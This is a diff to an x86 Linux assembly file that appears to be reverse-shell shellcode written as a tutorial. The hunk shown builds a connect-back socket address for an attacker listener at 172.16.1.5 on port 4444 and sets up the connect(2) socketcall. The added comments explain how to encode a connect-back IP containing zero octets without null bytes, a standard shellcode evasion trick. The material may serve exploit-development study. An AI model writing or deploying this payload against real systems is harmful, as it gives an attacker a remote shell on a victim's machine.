@@ -36,10 +36,25 @@ _start:
 ; Now we build a sockaddr struct representing the IP address and port we want to connect back to.
 
     push 0x050110ac  ; Push destination IP address, in this case 172.16.1.5
+
+        ; If you need to connect back to an IP with a null byte in it (i.e. one of the octets is zero, such as 10.0.0.5) we need to do extra legwork to push the IP address
+
+        ; for example to use 10.0.0.5:
+        ;   add dh, 0x05
+        ;   push word dx
+        ;   xor edx edx
+        ;   add dl, 0xa
+        ;   push word dx
+        ;   xor edx edx
+
+        ; This will result in this dword being on the stack: 0x0500000a, when we examine a pointer to it byte by byte it is read as 0x0a, 0x00, 0x00, 0x05, our destination IP address.
+
     push word 0x5c11 ; push port number
     push word bx     ; push 0x02
+
     inc ebx          ; connect(2)'s socket call id is 3, so we bump ebx up one.
     mov ecx, esp     ; save address to struct in ecx
+
 
 ; And now set up the connect(2) socketcall. Its arguments are identical to bind(2) from our bind shell.
     push 0x10
